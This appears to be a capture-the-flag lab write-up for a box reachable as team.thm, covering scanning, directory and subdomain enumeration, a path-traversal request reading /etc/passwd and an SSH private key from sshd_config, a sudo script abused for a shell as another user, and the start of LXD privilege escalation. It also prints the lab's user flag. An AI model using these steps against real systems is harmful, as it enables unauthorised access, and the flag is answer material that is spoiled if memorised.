<img width="1904" height="294" alt="image" src="https://github.com/user-attachments/assets/adf6955a-9748-4861-9a7e-fbd3473140b9" />
### 1. Initial Reconnaissance

First, we check if the target is alive.
ping -c 3 10.48.132.237
<img width="797" height="182" alt="image" src="https://github.com/user-attachments/assets/86f8aa12-6638-4b16-be5d-db0bd6b4918f" />
Then scan open ports.
nmap -sC -sV -oN scan.txt 10.48.132.237
<img width="1150" height="352" alt="image" src="https://github.com/user-attachments/assets/5c48789e-9489-421f-8370-843684f3a681" />
This shows SSH and HTTP are available.

**What to expect:**

- **Port 21 (FTP):** vsftpd 3.0.5 (We know anonymous is disabled).
- **Port 22 (SSH):** OpenSSH.
- **Port 80 (HTTP):** Apache.
  ### 2. Web Enumeration (Port 80)

Open website in browser:
http://10.48.132.237
<img width="1277" height="759" alt="image" src="https://github.com/user-attachments/assets/aed2e724-5afc-498c-ba40-e80aad0c2ea8" />
### Step 3: Directory Enumeration (Finding robots.txt)

Now, enumerate the directories on the main site to find hidden files. This is where we discover the username "dale".

**Run Gobuster:**
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,zip
<img width="953" height="759" alt="image" src="https://github.com/user-attachments/assets/6da5b5cf-cd14-4ec1-be9e-98975536145b" />
**Key Findings:**

- `/scripts` (Status: 301) -> Forbidden (403)
- `/robots.txt` (Status: 200)

**Check robots.txt:**
curl http://team.thm/robots.txt
<img width="905" height="70" alt="image" src="https://github.com/user-attachments/assets/d57539e0-1605-405d-a021-d80cab172452" />
**Output:**

`dale`

This reveals a potential username: **dale**.
### Step 4: Subdomain Discovery

We need to find where to use this username or find other entry points.

**Run Gobuster (VHost Mode):**
gobuster vhost -u http://team.thm -w /usr/share/wordlists/dirb/common.txt --append-domain
<img width="1306" height="751" alt="image" src="https://github.com/user-attachments/assets/12acd3ae-4041-4e13-a5c3-4e9a6b79ae81" />
<img width="1326" height="269" alt="image" src="https://github.com/user-attachments/assets/8b6cccaf-cae9-4cb3-a8b9-143dbb737b36" />
**Result:** Found `dev.team.thm`.
****

### Step 5: Exploiting LFI (The Foothold)

Go to the vulnerable URL: `http://dev.team.thm`
curl "http://dev.team.thm/script.php?page=../../../../etc/passwd"
<img width="1324" height="724" alt="image" src="https://github.com/user-attachments/assets/80a9c3cc-27a4-449f-8da7-7351baa5be57" />
You should see users `dale` (1000) and `gyles` (1001).

**Extract the SSH Key:**
We know `dale` keeps his key in the SSH config file.
curl "http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config"
<img width="1329" height="728" alt="image" src="https://github.com/user-attachments/assets/b99defcf-ed94-4252-975c-21b14e8b38a3" />
<img width="1332" height="697" alt="image" src="https://github.com/user-attachments/assets/13f0e7f0-e391-4fae-85f3-4213ba815669" />
**Action:**

1. Look for the key block at the bottom of the output.
2. Copy everything from `----BEGIN OPENSSH PRIVATE KEY-----` to `----END OPENSSH PRIVATE KEY-----`.
3. Paste it into a file named `dale.key`.

### Step 6: Sanitizing the Key & Logging In

**Clean and Permission:**
sed -i 's/^#//' dale.key
chmod 600 dale.key
Login:
ssh -i dale.key dale@10.48.132.237
<img width="1326" height="271" alt="image" src="https://github.com/user-attachments/assets/1e990180-20f7-41b5-95ce-213d1302f9b2" />
Once in, grab the user flag: cat user.txt
<img width="1220" height="54" alt="image" src="https://github.com/user-attachments/assets/b254cf36-670f-478e-80b5-c1648a009664" />
THM{6Y0TXHz7c2d}

### Step 7: Lateral Movement (Dale -> Gyles)

Check permissions:
sudo -l
<img width="1338" height="120" alt="image" src="https://github.com/user-attachments/assets/3a7e6441-b722-4302-b6b0-9a49c0980510" />
*(Output: `(gyles) NOPASSWD: /home/gyles/admin_checks`)*

**Exploit the Script:**
sudo -u gyles /home/gyles/admin_checks
sudo -u gyles /home/gyles/admin_checks
1. **Prompt 1 (Name):** `test`
2. **Prompt 2 (Date):** `/bin/bash`

You are now **gyles**.
<img width="1345" height="138" alt="image" src="https://github.com/user-attachments/assets/f1049672-c50f-47c8-99d2-35e9a6f51657" />
### Enumerate as gyles

Check groups:
groups
<img width="1336" height="161" alt="image" src="https://github.com/user-attachments/assets/6ad58cb9-ddac-46b2-b5ce-7a3b0642221c" />
`lxd` group = ROOT POSSIBLE

Being in `lxd` allows container escape.
### Step 8: LXD Privilege Escalation

Since internet is blocked, we create our own image.

**Create Workspace**
<img width="1324" height="49" alt="image" src="https://github.com/user-attachments/assets/63b18809-d8f7-4eb7-89d0-84e6065d3467" />
Copy BusyBox
<img width="1338" height="132" alt="image" src="https://github.com/user-attachments/assets/e6c63d81-937e-4aed-80c7-3712c224eff2" />
Create Init File
<img width="1336" height="130" alt="image" src="https://github.com/user-attachments/assets/30c625fc-a0de-4592-9345-d512e9674046" />
Create Metadata
<img width="1337" height="116" alt="image" src="https://github.com/user-attachments/assets/e68afee8-2052-44cb-bdd7-c0b26d132403" />
Package Image
<img width="1341" height="40" alt="image" src="https://github.com/user-attachments/assets/b9597e0b-9c2e-4e27-b72e-c7cf3476f1ff" />
Import Image
<img width="1329" height="137" alt="image" src="https://github.com/user-attachments/assets/d7c04c99-5bae-46ce-aa10-89d7c58ffe3e" />
You should see `pwnimg`.

**Create Privileged Container**
<img width="1339" height="62" alt="image" src="https://github.com/user-attachments/assets/af6873fc-1dc6-4a41-8d43-bb5b1ef90990" />
Start Container
<img width="952" height="650" alt="image" src="https://github.com/user-attachments/assets/beb5d3c1-ab68-4956-b4b1-4c46710d9acb" />







